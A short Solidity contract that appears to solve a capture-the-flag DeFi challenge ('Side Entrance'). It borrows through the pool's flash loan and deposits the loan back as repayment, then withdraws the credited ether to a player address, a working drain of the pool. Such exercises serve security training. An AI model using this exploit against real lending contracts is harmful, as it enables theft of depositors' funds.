//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";
contract side{
    SideEntranceLenderPool Pool;
    constructor(address pool){
         Pool=SideEntranceLenderPool(pool);
    }
    function execute() external payable{
        console.log("balance==",address(this).balance);
        Pool.deposit{value:address(this).balance}();
        console.log("balance==",address(this).balance);
    }
    function onflash(uint256 amount) public{
        Pool.flashLoan(amount);
    }
    function withdraw (address payable player) public {
        console.log("balancewithdraw==",address(this).balance);
        Pool.withdraw();
        console.log("balancewithdraw==",address(this).balance);
        player.transfer(address(this).balance);
    }
    receive() external payable {}
}